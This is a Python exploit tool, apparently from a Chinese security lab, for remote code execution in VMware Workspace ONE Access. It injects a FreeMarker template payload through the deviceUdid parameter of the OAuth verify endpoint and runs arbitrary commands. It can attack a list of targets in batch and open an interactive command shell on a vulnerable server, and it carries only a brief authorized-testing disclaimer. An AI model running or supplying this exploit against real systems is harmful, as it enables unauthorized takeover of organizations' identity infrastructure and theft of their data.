import requests
import re
import sys
import getopt
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check(target,cmd):
    global flag
    cmd = urllib.parse.quote_plus(cmd)
    payload = '/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b"freemarker%2etemplate%2eutility%2eExecute"%3fnew%28%29%28"' + cmd + '"%29%7d'
    url = target + payload
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }

    pattern = re.compile(r'device id:(.*?),',re.S)

    try:
        r = requests.get(url, headers=headers, proxies=None, timeout=30, verify=False)
        if r.status_code == 400:
            re_result_list = re.findall(pattern,r.text)
            re_result = re_result_list[0].strip().strip("\\n")
            flag = True
            return re_result
        else:
            print(f"[-] {target} 漏洞利用失败")
    except Exception as e:
        print(f"[-] {target} 网络连接错误")

def read_file(file,cmd):
    with open(file,"r",encoding="utf-8") as f:
        for line in f.readlines():
            line = line.strip("\n").strip("/")
            batch_result = check(line, cmd)
            print(f"[+] {line} 漏洞利用成功,命令执行结果为:{batch_result}")


def help_list():
    print("-u --url         - Enter attack target")
    print("-c --command     - Commands to execute")
    print("-f --file        - Batch attack target files")
    print("-h --help        - Get user help summary page")
    print("--shell          - Start interactive interface [Not available for batch scanning]")

def usage():
    print("")
    print("VMware_Workspace_ONE_Access_RCE / VMware_Workspace_ONE_Access远程代码执行漏洞")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

if __name__ == '__main__':
    usage()

    user_help = False
    flag = False
    batch_rce = False
    bash_shell = False

    if not len(sys.argv[1:]):
        help_list()
        sys.exit(0)
    try:
        opts,args = getopt.getopt(sys.argv[1:],"c:u:f:h",["command","url","file","help","shell"])
    except getopt.GetoptError as e:
            print(str(e))
            sys.exit(0)

    for o,a in opts:
        if o in ("-u","--url"):
            target = a
        elif o in ("-c","--command"):
            cmd = a
        elif o in ("-f","--file"):
            url_file = a
            batch_rce = True
        elif o in ("-h","--help"):
            user_help = True
        elif o in ("--shell"):
            if not batch_rce:
                bash_shell = True
        else:
            assert False,"Unhandled Option"
    if user_help:
        help_list()
        sys.exit(0)
    else:
        result = check(target,cmd)
        if flag:
            print(f"[+] {target} 漏洞利用成功,命令执行结果为:{result}")

    if batch_rce:
        read_file(url_file,cmd)

    if bash_shell and flag:
        while True:
            cmd = input("Jun_sheng> ")
            result = check(target, cmd)
            result = result.replace("\\n","\r\n")
            print(result)
